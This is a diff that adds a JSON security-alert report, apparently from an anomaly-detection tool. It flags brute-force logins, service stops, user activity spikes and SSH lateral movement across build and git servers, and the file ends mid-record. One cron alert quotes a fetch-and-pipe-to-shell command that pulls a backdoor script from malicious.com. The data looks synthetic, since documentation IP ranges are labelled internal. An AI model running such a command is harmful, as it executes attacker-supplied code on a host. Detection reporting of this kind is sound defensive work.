@@ -1,0 +1,1285 @@
+{
+  "generated_at": "2026-01-21T04:28:28.174858+00:00",
+  "summary": {
+    "total_alerts": 41,
+    "severity_breakdown": {
+      "WARNING": 11,
+      "CRITICAL": 30
+    },
+    "type_breakdown": {
+      "credential_bruteforce_detected": 7,
+      "service_manipulation_detected": 13,
+      "new_user": 3,
+      "user_events_spike": 6,
+      "user_login_fail_spike": 5,
+      "cron_job_overlap": 1,
+      "ssh_lateral_movement": 6
+    },
+    "top_subjects": [
+      "minhtq",
+      "192.168.1.101",
+      "198.51.100.0",
+      "192.168.1.100",
+      "10.0.0.2",
+      "ubuntu",
+      "203.0.113.50",
+      "huyle",
+      "admin",
+      "gitsrv01"
+    ]
+  },
+  "alerts": [
+    {
+      "type": "credential_bruteforce_detected",
+      "subject": "10.0.0.1",
+      "severity": "WARNING",
+      "score": 4.285714285714286,
+      "text": "Credential brute force detected from internal IP 10.0.0.1: 6/14 failed attempts (42.9% failure rate).",
+      "evidence": {
+        "source_ip": "10.0.0.1",
+        "total_attempts": 14,
+        "failed_attempts": 6,
+        "failure_rate": 0.42857142857142855,
+        "is_external_ip": false
+      },
+      "prompt_ctx": {
+        "user": null,
+        "group": null,
+        "behavior": {
+          "type": "credential_bruteforce",
+          "source_ip": "10.0.0.1",
+          "attempts": 14,
+          "failures": 6,
+          "is_external": false
+        },
+        "time": null,
+        "baseline": {
+          "expected_failure_rate": 0.1
+        },
+        "extras": {
+          "reason": "High login failure rate from 10.0.0.1"
+        }
+      }
+    },
+    {
+      "type": "credential_bruteforce_detected",
+      "subject": "10.0.0.2",
+      "severity": "WARNING",
+      "score": 6.086956521739131,
+      "text": "Credential brute force detected from internal IP 10.0.0.2: 14/23 failed attempts (60.9% failure rate).",
+      "evidence": {
+        "source_ip": "10.0.0.2",
+        "total_attempts": 23,
+        "failed_attempts": 14,
+        "failure_rate": 0.6086956521739131,
+        "is_external_ip": false
+      },
+      "prompt_ctx": {
+        "user": null,
+        "group": null,
+        "behavior": {
+          "type": "credential_bruteforce",
+          "source_ip": "10.0.0.2",
+          "attempts": 23,
+          "failures": 14,
+          "is_external": false
+        },
+        "time": null,
+        "baseline": {
+          "expected_failure_rate": 0.1
+        },
+        "extras": {
+          "reason": "Elevated login failure rate from internal IP 10.0.0.2"
+        }
+      }
+    },
+    {
+      "type": "credential_bruteforce_detected",
+      "subject": "172.16.0.1",
+      "severity": "WARNING",
+      "score": 5.238095238095238,
+      "text": "Credential brute force detected from internal IP 172.16.0.1: 11/21 failed attempts (52.4% failure rate).",
+      "evidence": {
+        "source_ip": "172.16.0.1",
+        "total_attempts": 21,
+        "failed_attempts": 11,
+        "failure_rate": 0.5238095238095238,
+        "is_external_ip": false
+      },
+      "prompt_ctx": {
+        "user": null,
+        "group": null,
+        "behavior": {
+          "type": "credential_bruteforce",
+          "source_ip": "172.16.0.1",
+          "attempts": 21,
+          "failures": 11,
+          "is_external": false
+        },
+        "time": null,
+        "baseline": {
+          "expected_failure_rate": 0.1
+        },
+        "extras": {
+          "reason": "Elevated login failure rate from internal IP 172.16.0.1"
+        }
+      }
+    },
+    {
+      "type": "credential_bruteforce_detected",
+      "subject": "192.168.1.100",
+      "severity": "WARNING",
+      "score": 5.416666666666666,
+      "text": "Credential brute force detected from internal IP 192.168.1.100: 13/24 failed attempts (54.2% failure rate).",
+      "evidence": {
+        "source_ip": "192.168.1.100",
+        "total_attempts": 24,
+        "failed_attempts": 13,
+        "failure_rate": 0.5416666666666666,
+        "is_external_ip": false
+      },
+      "prompt_ctx": {
+        "user": null,
+        "group": null,
+        "behavior": {
+          "type": "credential_bruteforce",
+          "source_ip": "192.168.1.100",
+          "attempts": 24,
+          "failures": 13,
+          "is_external": false
+        },
+        "time": null,
+        "baseline": {
+          "expected_failure_rate": 0.1
+        },
+        "extras": {
+          "reason": "Elevated login failure rate from internal IP 192.168.1.100"
+        }
+      }
+    },
+    {
+      "type": "credential_bruteforce_detected",
+      "subject": "192.168.1.101",
+      "severity": "WARNING",
+      "score": 5.0,
+      "text": "Credential brute force detected from internal IP 192.168.1.101: 11/22 failed attempts (50.0% failure rate).",
+      "evidence": {
+        "source_ip": "192.168.1.101",
+        "total_attempts": 22,
+        "failed_attempts": 11,
+        "failure_rate": 0.5,
+        "is_external_ip": false
+      },
+      "prompt_ctx": {
+        "user": null,
+        "group": null,
+        "behavior": {
+          "type": "credential_bruteforce",
+          "source_ip": "192.168.1.101",
+          "attempts": 22,
+          "failures": 11,
+          "is_external": false
+        },
+        "time": null,
+        "baseline": {
+          "expected_failure_rate": 0.1
+        },
+        "extras": {
+          "reason": "High login failure rate from 192.168.1.101"
+        }
+      }
+    },
+    {
+      "type": "credential_bruteforce_detected",
+      "subject": "198.51.100.0",
+      "severity": "WARNING",
+      "score": 5.5,
+      "text": "Credential brute force detected from internal IP 198.51.100.0: 11/20 failed attempts (55.0% failure rate).",
+      "evidence": {
+        "source_ip": "198.51.100.0",
+        "total_attempts": 20,
+        "failed_attempts": 11,
+        "failure_rate": 0.55,
+        "is_external_ip": false
+      },
+      "prompt_ctx": {
+        "user": null,
+        "group": null,
+        "behavior": {
+          "type": "credential_bruteforce",
+          "source_ip": "198.51.100.0",
+          "attempts": 20,
+          "failures": 11,
+          "is_external": false
+        },
+        "time": null,
+        "baseline": {
+          "expected_failure_rate": 0.1
+        },
+        "extras": {
+          "reason": "Elevated login failure rate from internal IP 198.51.100.0"
+        }
+      }
+    },
+    {
+      "type": "credential_bruteforce_detected",
+      "subject": "203.0.113.50",
+      "severity": "WARNING",
+      "score": 5.652173913043478,
+      "text": "Credential brute force detected from internal IP 203.0.113.50: 13/23 failed attempts (56.5% failure rate).",
+      "evidence": {
+        "source_ip": "203.0.113.50",
+        "total_attempts": 23,
+        "failed_attempts": 13,
+        "failure_rate": 0.5652173913043478,
+        "is_external_ip": false
+      },
+      "prompt_ctx": {
+        "user": null,
+        "group": null,
+        "behavior": {
+          "type": "credential_bruteforce",
+          "source_ip": "203.0.113.50",
+          "attempts": 23,
+          "failures": 13,
+          "is_external": false
+        },
+        "time": null,
+        "baseline": {
+          "expected_failure_rate": 0.1
+        },
+        "extras": {
+          "reason": "Elevated login failure rate from internal IP 203.0.113.50"
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "minhtq",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'minhtq' stopped apache 1x on buildsrv01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "apache_stop",
+        "host": "buildsrv01",
+        "stop_count": 1,
+        "sample_message": "Stopping apache2 service (requested by minhtq)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "minhtq",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "apache_stop",
+          "defense_evasion": false
+        },
+        "time": "04:18 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "buildsrv01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "minhtq",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'minhtq' stopped nginx 1x on buildsrv01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "nginx_stop",
+        "host": "buildsrv01",
+        "stop_count": 1,
+        "sample_message": "Stopping nginx service (requested by minhtq)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "minhtq",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "nginx_stop",
+          "defense_evasion": false
+        },
+        "time": "05:20 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "buildsrv01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "tnghia",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'tnghia' stopped apache 1x on gitsrv01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "apache_stop",
+        "host": "gitsrv01",
+        "stop_count": 1,
+        "sample_message": "Stopping apache2 service (requested by tnghia)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "tnghia",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "apache_stop",
+          "defense_evasion": false
+        },
+        "time": "05:39 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "gitsrv01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "minhtq",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'minhtq' stopped apache 1x on gitsrv01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "apache_stop",
+        "host": "gitsrv01",
+        "stop_count": 1,
+        "sample_message": "Stopping apache2 service (requested by minhtq)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "minhtq",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "apache_stop",
+          "defense_evasion": false
+        },
+        "time": "06:04 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "gitsrv01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "minhtq",
+      "severity": "CRITICAL",
+      "score": 9.0,
+      "text": "🚨 SERVICE MANIPULATION: User 'minhtq' stopped postgresql 1x on gitsrv01. Database service shutdown - potential data attack or denial of service",
+      "evidence": {
+        "method": "postgresql_stop",
+        "host": "gitsrv01",
+        "stop_count": 1,
+        "sample_message": "Stopping postgresql service (requested by minhtq)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "minhtq",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "postgresql_stop",
+          "defense_evasion": false
+        },
+        "time": "06:06 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "gitsrv01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "khanhng",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'khanhng' stopped nginx 2x on gitsrv01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "nginx_stop",
+        "host": "gitsrv01",
+        "stop_count": 2,
+        "sample_message": "Stopping nginx service (requested by khanhng)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "khanhng",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "nginx_stop",
+          "defense_evasion": false
+        },
+        "time": "06:34 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "gitsrv01",
+          "stop_count": 2
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "quangdev",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'quangdev' stopped apache 1x on gitsrv01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "apache_stop",
+        "host": "gitsrv01",
+        "stop_count": 1,
+        "sample_message": "Stopping apache2 service (requested by quangdev)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "quangdev",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "apache_stop",
+          "defense_evasion": false
+        },
+        "time": "06:44 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "gitsrv01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "tnghia",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'tnghia' stopped nginx 1x on ci-runner01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "nginx_stop",
+        "host": "ci-runner01",
+        "stop_count": 1,
+        "sample_message": "Stopping nginx service (requested by tnghia)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "tnghia",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "nginx_stop",
+          "defense_evasion": false
+        },
+        "time": "07:34 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "ci-runner01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "quangdev",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'quangdev' stopped nginx 1x on ci-runner01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "nginx_stop",
+        "host": "ci-runner01",
+        "stop_count": 1,
+        "sample_message": "Stopping nginx service (requested by quangdev)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "quangdev",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "nginx_stop",
+          "defense_evasion": false
+        },
+        "time": "07:53 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "ci-runner01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "khanhng",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'khanhng' stopped nginx 1x on ci-runner01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "nginx_stop",
+        "host": "ci-runner01",
+        "stop_count": 1,
+        "sample_message": "Stopping nginx service (requested by khanhng)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "khanhng",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "nginx_stop",
+          "defense_evasion": false
+        },
+        "time": "08:07 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "ci-runner01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "huyle",
+      "severity": "CRITICAL",
+      "score": 9.0,
+      "text": "🚨 SERVICE MANIPULATION: User 'huyle' stopped postgresql 1x on buildsrv01. Database service shutdown - potential data attack or denial of service",
+      "evidence": {
+        "method": "postgresql_stop",
+        "host": "buildsrv01",
+        "stop_count": 1,
+        "sample_message": "Stopping postgresql service (requested by huyle)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "huyle",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "postgresql_stop",
+          "defense_evasion": false
+        },
+        "time": "08:38 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "buildsrv01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "minhtq",
+      "severity": "CRITICAL",
+      "score": 9.0,
+      "text": "🚨 SERVICE MANIPULATION: User 'minhtq' stopped postgresql 1x on buildsrv01. Database service shutdown - potential data attack or denial of service",
+      "evidence": {
+        "method": "postgresql_stop",
+        "host": "buildsrv01",
+        "stop_count": 1,
+        "sample_message": "Stopping postgresql service (requested by minhtq)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "minhtq",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "postgresql_stop",
+          "defense_evasion": false
+        },
+        "time": "09:19 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "buildsrv01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "huyle",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'huyle' stopped nginx 1x on buildsrv01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "nginx_stop",
+        "host": "buildsrv01",
+        "stop_count": 1,
+        "sample_message": "Stopping nginx service (requested by huyle)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "huyle",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "nginx_stop",
+          "defense_evasion": false
+        },
+        "time": "09:25 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "buildsrv01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "new_user",
+      "subject": "root",
+      "severity": "WARNING",
+      "score": 4.0,
+      "text": "User mới root xuất hiện với 23 sự kiện, chưa có trong baseline.",
+      "evidence": {
+        "events": 23
+      },
+      "prompt_ctx": {
+        "user": "root",
+        "group": null,
+        "behavior": {
+          "type": "new_user",
+          "events": 23
+        },
+        "time": null,
+        "baseline": {},
+        "extras": {
+          "reason": "User chưa có trong baseline"
+        }
+      }
+    },
+    {
+      "type": "new_user",
+      "subject": "ubuntu",
+      "severity": "WARNING",
+      "score": 4.0,
+      "text": "User mới ubuntu xuất hiện với 25 sự kiện, chưa có trong baseline.",
+      "evidence": {
+        "events": 25
+      },
+      "prompt_ctx": {
+        "user": "ubuntu",
+        "group": null,
+        "behavior": {
+          "type": "new_user",
+          "events": 25
+        },
+        "time": null,
+        "baseline": {},
+        "extras": {
+          "reason": "User chưa có trong baseline"
+        }
+      }
+    },
+    {
+      "type": "new_user",
+      "subject": "admin",
+      "severity": "WARNING",
+      "score": 4.0,
+      "text": "User mới admin xuất hiện với 37 sự kiện, chưa có trong baseline.",
+      "evidence": {
+        "events": 37
+      },
+      "prompt_ctx": {
+        "user": "admin",
+        "group": null,
+        "behavior": {
+          "type": "new_user",
+          "events": 37
+        },
+        "time": null,
+        "baseline": {},
+        "extras": {
+          "reason": "User chưa có trong baseline"
+        }
+      }
+    },
+    {
+      "type": "user_events_spike",
+      "subject": "huydev",
+      "severity": "CRITICAL",
+      "score": 9.273200358989294,
+      "text": "Số sự kiện của user huydev tăng đột biến: 362 so với trung bình 132±25.",
+      "evidence": {
+        "current": 362,
+        "mean": 132.5,
+        "std": 24.748737341529164
+      },
+      "prompt_ctx": {
+        "user": "huydev",
+        "group": null,
+        "behavior": {
+          "type": "events",
+          "value": 362
+        },
+        "time": null,
+        "baseline": {
+          "mean": 132.5,
+          "std": 24.748737341529164
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_events_spike",
+      "subject": "huyle",
+      "severity": "CRITICAL",
+      "score": 17.53624817342638,
+      "text": "Số sự kiện của user huyle tăng đột biến: 368 so với trung bình 120±14.",
+      "evidence": {
+        "current": 368,
+        "mean": 120.0,
+        "std": 14.142135623730951
+      },
+      "prompt_ctx": {
+        "user": "huyle",
+        "group": null,
+        "behavior": {
+          "type": "events",
+          "value": 368
+        },
+        "time": null,
+        "baseline": {
+          "mean": 120.0,
+          "std": 14.142135623730951
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_events_spike",
+      "subject": "khanhng",
+      "severity": "CRITICAL",
+      "score": 9.192388155425117,
+      "text": "Số sự kiện của user khanhng tăng đột biến: 336 so với trung bình 128±23.",
+      "evidence": {
+        "current": 336,
+        "mean": 128.0,
+        "std": 22.627416997969522
+      },
+      "prompt_ctx": {
+        "user": "khanhng",
+        "group": null,
+        "behavior": {
+          "type": "events",
+          "value": 336
+        },
+        "time": null,
+        "baseline": {
+          "mean": 128.0,
+          "std": 22.627416997969522
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_events_spike",
+      "subject": "minhtq",
+      "severity": "CRITICAL",
+      "score": 18.259992761229082,
+      "text": "Số sự kiện của user minhtq tăng đột biến: 346 so với trung bình 126±12.",
+      "evidence": {
+        "current": 346,
+        "mean": 126.5,
+        "std": 12.020815280171307
+      },
+      "prompt_ctx": {
+        "user": "minhtq",
+        "group": null,
+        "behavior": {
+          "type": "events",
+          "value": 346
+        },
+        "time": null,
+        "baseline": {
+          "mean": 126.5,
+          "std": 12.020815280171307
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_events_spike",
+      "subject": "quangdev",
+      "severity": "CRITICAL",
+      "score": 17.001306521572207,
+      "text": "Số sự kiện của user quangdev tăng đột biến: 397 so với trung bình 120±16.",
+      "evidence": {
+        "current": 397,
+        "mean": 120.5,
+        "std": 16.263455967290593
+      },
+      "prompt_ctx": {
+        "user": "quangdev",
+        "group": null,
+        "behavior": {
+          "type": "events",
+          "value": 397
+        },
+        "time": null,
+        "baseline": {
+          "mean": 120.5,
+          "std": 16.263455967290593
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_events_spike",
+      "subject": "tnghia",
+      "severity": "CRITICAL",
+      "score": 28.461047942758537,
+      "text": "Số sự kiện của user tnghia tăng đột biến: 451 so với trung bình 129±11.",
+      "evidence": {
+        "current": 451,
+        "mean": 129.0,
+        "std": 11.313708498984761
+      },
+      "prompt_ctx": {
+        "user": "tnghia",
+        "group": null,
+        "behavior": {
+          "type": "events",
+          "value": 451
+        },
+        "time": null,
+        "baseline": {
+          "mean": 129.0,
+          "std": 11.313708498984761
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_login_fail_spike",
+      "subject": "huydev",
+      "severity": "CRITICAL",
+      "score": 13.232998333633962,
+      "text": "Số lần đăng nhập thất bại của user huydev tăng đột biến: 97 so với trung bình 32±5.",
+      "evidence": {
+        "current": 97,
+        "mean": 31.5,
+        "std": 4.949747468305833
+      },
+      "prompt_ctx": {
+        "user": "huydev",
+        "group": null,
+        "behavior": {
+          "type": "login_fail",
+          "value": 97
+        },
+        "time": null,
+        "baseline": {
+          "mean": 31.5,
+          "std": 4.949747468305833
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_login_fail_spike",
+      "subject": "khanhng",
+      "severity": "WARNING",
+      "score": 5.578286829360541,
+      "text": "Số lần đăng nhập thất bại của user khanhng tăng đột biến: 105 so với trung bình 34±13.",
+      "evidence": {
+        "current": 105,
+        "mean": 34.0,
+        "std": 12.727922061357855
+      },
+      "prompt_ctx": {
+        "user": "khanhng",
+        "group": null,
+        "behavior": {
+          "type": "login_fail",
+          "value": 105
+        },
+        "time": null,
+        "baseline": {
+          "mean": 34.0,
+          "std": 12.727922061357855
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_login_fail_spike",
+      "subject": "minhtq",
+      "severity": "CRITICAL",
+      "score": 43.840620433565945,
+      "text": "Số lần đăng nhập thất bại của user minhtq tăng đột biến: 97 so với trung bình 35±1.",
+      "evidence": {
+        "current": 97,
+        "mean": 35.0,
+        "std": 1.4142135623730951
+      },
+      "prompt_ctx": {
+        "user": "minhtq",
+        "group": null,
+        "behavior": {
+          "type": "login_fail",
+          "value": 97
+        },
+        "time": null,
+        "baseline": {
+          "mean": 35.0,
+          "std": 1.4142135623730951
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_login_fail_spike",
+      "subject": "quangdev",
+      "severity": "CRITICAL",
+      "score": 10.606601717798213,
+      "text": "Số lần đăng nhập thất bại của user quangdev tăng đột biến: 102 so với trung bình 34±6.",
+      "evidence": {
+        "current": 102,
+        "mean": 34.5,
+        "std": 6.363961030678928
+      },
+      "prompt_ctx": {
+        "user": "quangdev",
+        "group": null,
+        "behavior": {
+          "type": "login_fail",
+          "value": 102
+        },
+        "time": null,
+        "baseline": {
+          "mean": 34.5,
+          "std": 6.363961030678928
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_login_fail_spike",
+      "subject": "tnghia",
+      "severity": "CRITICAL",
+      "score": 152.0279579551077,
+      "text": "Số lần đăng nhập thất bại của user tnghia tăng đột biến: 141 so với trung bình 34±1.",
+      "evidence": {
+        "current": 141,
+        "mean": 33.5,
+        "std": 0.7071067811865476
+      },
+      "prompt_ctx": {
+        "user": "tnghia",
+        "group": null,
+        "behavior": {
+          "type": "login_fail",
+          "value": 141
+        },
+        "time": null,
+        "baseline": {
+          "mean": 33.5,
+          "std": 0.7071067811865476
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "cron_job_overlap",
+      "subject": "gitsrv01",
+      "severity": "CRITICAL",
+      "score": 8.0,
+      "text": "Cron job overlap: script 'wget http://malicious.com/backdoor.sh | bash' executed 95 times by 6 users. ⚠️ Có thể là kỹ thuật Defense Evasion - lợi dụng tiến trình backup/cron hợp pháp để che giấu hành vi đáng ngờ.",
+      "evidence": {
+        "script": "wget http://malicious.com/backdoor.sh | bash",
+        "execution_count": 95,
+        "unique_users": 6,
+        "users": [
+          "tnghia",
+          "huyle",
+          "huydev",
+          "khanhng",
+          "minhtq",
+          "quangdev"
+        ]
+      },
+      "prompt_ctx": {
+        "behavior": {
+          "type": "cron_job_overlap",
+          "defense_evasion_warning": "Đây có thể là kỹ thuật ẩn mình (Defense Evasion), lợi dụng tiến trình backup/cron hợp pháp để che giấu hành vi gửi dữ liệu trái phép ra ngoài hoặc thực thi mã độc."
+        }
+      }
+    },
+    {
+      "type": "ssh_lateral_movement",
+      "subject": "huydev",
+      "severity": "CRITICAL",
+      "score": 9.5,
+      "text": "SSH lateral movement detected: User 'huydev' logged in 265 times from 21 different source IPs to 3 servers.",
+      "evidence": {
+        "username": "huydev",
+        "login_count": 265,
+        "unique_source_ips": 21,
+        "source_ips": [
+          "10.175.45.166",
+          "10.0.0.1",
+          "10.141.10.67",
+          "10.132.199.126",
+          "10.233.64.205",
+          "10.168.102.183",
+          "10.175.175.89",
+          "203.0.113.50",
+          "10.149.15.24",
+          "10.243.246.222"
+        ],
+        "target_hosts": [
+          "buildsrv01",
+          "gitsrv01",
+          "ci-runner01"
+        ]
+      },
+      "prompt_ctx": {
+        "user": "huydev",
+        "group": null,
+        "behavior": {
+          "type": "ssh_lateral_movement",
+          "logins": 265,
+          "source_ips": 21
+        },
+        "time": null,
+        "baseline": {
+          "expected_source_ips": 1
+        },
+        "extras": {
+          "reason": "Multiple source IPs indicate lateral movement or compromised credentials"
+        }
+      }
+    },
+    {
+      "type": "ssh_lateral_movement",
+      "subject": "huyle",
+      "severity": "CRITICAL",
+      "score": 9.5,
+      "text": "SSH lateral movement detected: User 'huyle' logged in 294 times from 20 different source IPs to 3 servers.",
+      "evidence": {
+        "username": "huyle",
+        "login_count": 294,
+        "unique_source_ips": 20,
+        "source_ips": [
+          "10.71.227.1",
+          "203.0.113.50",
+          "10.132.199.126",
+          "10.175.45.166",
+          "10.168.102.183",
+          "172.16.0.1",
+          "10.175.175.89",
+          "10.60.88.220",
+          "203.0.113.100",
+          "10.233.64.205"
+        ],
+        "target_hosts": [
+          "gitsrv01",
+          "buildsrv01",
+          "ci-runner01"
+        ]
+      },
+      "prompt_ctx": {
+        "user": "huyle",
+        "group": null,
+        "behavior": {
+          "type": "ssh_lateral_movement",
+          "logins": 294,
+          "source_ips": 20
+        },
+        "time": null,
+        "baseline": {
+          "expected_source_ips": 1
+        },
+        "extras": {
+          "reason": "Multiple source IPs indicate lateral movement or compromised credentials"
+        }
+      }
+    },
+    {
+      "type": "ssh_lateral_movement",
+      "subject": "khanhng",
+      "severity": "CRITICAL",
+      "score": 9.5,
+      "text": "SSH lateral movement detected: User 'khanhng' logged in 231 times from 19 different source IPs to 3 servers.",
+      "evidence": {
+        "username": "khanhng",
+        "login_count": 231,
+        "unique_source_ips": 19,
+        "source_ips": [
+          "203.0.113.100",
+          "10.175.175.89",
+          "10.141.10.67",
+          "10.132.199.126",
+          "10.233.64.205",
+          "192.168.1.101",
+          "10.116.28.19",
+          "10.29.141.140",
+          "10.243.246.222",
+          "172.16.0.1"
+        ],
+        "target_hosts": [
+          "buildsrv01",
+          "gitsrv01",
+          "ci-runner01"
+        ]
+      },
+      "prompt_ctx": {
+        "user": "khanhng",
+        "group": null,
+        "behavior": {
+          "type": "ssh_lateral_movement",
+          "logins": 231,
+          "source_ips": 19
+        },
+        "time": null,
+        "baseline": {
+          "expected_source_ips": 1
+        },
+        "extras": {
+          "reason": "Multiple source IPs indicate lateral movement or compromised credentials"
+        }
+      }
+    },
+    {
+      "type": "ssh_lateral_movement",
+      "subject": "minhtq",
+      "severity": "CRITICAL",
+      "score": 9.5,
+      "text": "SSH lateral movement detected: User 'minhtq' logged in 249 times from 21 different source IPs to 3 servers.",
+      "evidence": {
+        "username": "minhtq",
+        "login_count": 249,
+        "unique_source_ips": 21,
+        "source_ips": [
+          "10.175.175.89",
+          "10.168.102.183",
+          "10.132.199.126",
+          "10.71.227.1",
+          "10.116.28.19",
+          "10.149.15.24",
+          "10.175.45.166",
+          "203.0.113.50",
+          "203.0.113.100",
+          "10.97.208.176"
+        ],
+        "target_hosts": [
+          "gitsrv01",
+          "ci-runner01",
+          "buildsrv01"
+        ]
+      },
+      "prompt_ctx": {
+        "user": "minhtq",
+        "group": null,
+        "behavior": {
+          "type": "ssh_lateral_movement",
+          "logins": 249,
+          "source_ips": 21
+        },
+        "time": null,
+        "baseline": {
+          "expected_source_ips": 1
+        },
+        "extras": {
+          "reason": "Multiple source IPs indicate lateral movement or compromised credentials"
+        }
+      }
+    },
+    {
+      "type": "ssh_lateral_movement",
+      "subject": "quangdev",
+      "severity": "CRITICAL",
+      "score": 9.5,
+      "text": "SSH lateral movement detected: User 'quangdev' logged in 295 times from 20 different source IPs to 3 servers.",
+      "evidence": {
+        "username": "quangdev",
+        "login_count": 295,
+        "unique_source_ips": 20,
+        "source_ips": [
+          "10.233.64.205",
+          "10.97.208.176",
+          "10.149.15.24",
+          "10.116.28.19",
+          "10.243.246.222",
+          "203.0.113.100",
+          "10.60.88.220",
+          "10.141.10.67",
+          "172.16.0.1",
+          "10.29.141.140"
+        ],
+        "target_hosts": [
+          "buildsrv01",
+          "ci-runner01",
+          "gitsrv01"
+        ]
+      },
+      "prompt_ctx": {
+        "user": "quangdev",
